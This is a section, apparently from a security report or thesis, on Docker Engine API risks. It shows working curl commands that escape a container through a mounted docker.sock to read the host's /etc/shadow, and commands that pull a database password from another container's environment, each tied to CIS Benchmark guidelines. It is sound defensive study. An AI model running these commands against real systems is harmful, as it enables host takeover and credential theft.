\subsection{Docker Engine API}

The Docker Daemon runs a RESTful\footnote{\url{https://restfulapi.net/}} API\footnote{\url{https://docs.docker.com/engine/api/v1.40/}} that is used to communicate with the Docker Daemon. For example, when an user executes a Docker client command, it actually makes a request to the API. By default the API listens on a UNIX socket accessible through \lstinline{/var/run/docker.sock}, but it also possible to make it listen on a port. This makes it possible for anybody in the \lstinline{docker} group (and \lstinline{root}) to make HTTP requests. For example the following commands (to see all containers) produce the same output (albeit in a different format). The first one is a command using the Docker client and the second is a HTTP request (using \lstinline{curl}\footnote{\url{https://curl.haxx.se/}}).
\begin{lstlisting}[caption={Docker client and Socket},captionpos=b]
(host)$ docker ps -a
...
(host)$ curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/json?all=1"
...
\end{lstlisting}

\hfill

In some cases, it might be possible to access the API when it is not possible to access the Docker client. For example, if the permissions of the socket are incorrectly set. This is covered by CIS Benchmark guidelines 3.15 (Ensure that the Docker socket file ownership is set to root:docker) and 3.16(Ensure that the Docker socket file permissions are set to 660 or more restrictively).
Because API access gives the same exact possibilities as having access to the Docker client, this is very dangerous\cite{The-Dangers-Of-Docker-Sock}.
However, giving containers access to the API (by adding the socket as a volume) is a common practice, because it allows containers to monitor and analyze other containers.

\subsubsection{Container Escape}
If the \lstinline{/var/run/docker.sock} is added as a volume to a container, the container has access to the API\@. This means the process in the container has full access to Docker on the host. This can be used to escape, because the container can create another container with arbitrary volumes and commands. It is even possible to create an interactive shell in another container\cite{Escape-Socket-Shell}.

\hfill

Lets say we want to get the password hash of an user called \lstinline{admin} on the host. We are in a container that has access to \lstinline{/var/run/docker.sock}. We use the API to start another Docker container on the host, that has access to the password hash (located in \lstinline{/etc/shadow}). We read the password file, by looking at the logs of the container that we just started.

\begin{lstlisting}
(host)$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash
(cont)# curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"ubuntu:latest","Cmd":["cat", "/host/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}' "http://localhost/containers/create?name=escape"
...
(cont)# curl -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/escape/start"
(cont)# curl --output - --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=true"
...
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
...
(cont)# curl -XDELETE --unix-socket /var/run/docker.sock "http://localhost/containers/escape"
\end{lstlisting}

\hfill

This is also covered by CIS Benchmark guideline 5.31 (Ensure that the Docker socket is not mounted inside any containers).

\subsubsection{Sensitive Information}

When a container has access to \lstinline{/var/run/docker.sock} (i.e.\ when \lstinline{/var/run/docker.sock} is added as volume inside the container), it cannot only start new containers but it can also look at the configuration of existing containers. This configuration might contain sensitive information (e.g.\ passwords in the environment variables).

\hfill

Lets start a Postgres\footnote{\url{https://www.postgresql.org/}} database inside a Docker. From the documentation of the Postgres Docker image\footnote{\url{https://hub.docker.com/_/postgres}}, we know that we can provide a password using the \lstinline{POSTGRES_PASSWORD} environment variable. If we have access to another container which has access to the Docker API, we can read that password from the environment variable.

\begin{lstlisting}[caption={Example extract secrets using the Docker API},captionpos=b]
(host)$ docker run --name database -e POSTGRES_PASSWORD=thisshouldbesecret -d postgres
...
(host)$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock:ro ubuntu:latest bash
(cont)# apt update
...
(cont)# apt install curl jq
...
(cont)# curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/database/json" | jq -r '.Config.Env'
[
  "POSTGRES_PASSWORD=thisshouldbesecret",
  ...
]
\end{lstlisting}

\hfill

This is also covered by CIS Benchmark guideline 5.31 (Ensure that the Docker socket is not mounted inside any containers).

\subsubsection{Remote Access}
It is also possible to make the API listen on a TCP port. Ports 2375 and 2376 are usually used for HTTP and HTTPS communication, respectively. This, however, does bring all the extra complexity of TCP sockets with it. If not configured to only listen on \lstinline{localhost}, this gives every host on the network access to Docker (which might be desirable behavior). If the host is directly accessible by the internet, it gives everybody access to the full capabilities of Docker on the host. An attacker can exploit this by starting malicious containers\cite{Metasploit-Unprotected-TCP-Socket}.

\hfill

A malicious actor misused this feature in May 2019. He used Shodan\footnote{A search engine to search for systems connected to the internet.}\footnote{\url{https://www.shodan.io/}} to find unprotected publicly accessible Docker APIs and start containers that mine Monero\footnote{A cryptocurrency that focuses on privacy.} and find other hosts to infect\cite{zoolu2-bot-1807}\cite{zoolu2-bot-1809}\cite{zoolu2-bot-1853}.

The Docker CIS Benchmark do not cover anything about the possibility to make the API accessible over \lstinline{TCP}.
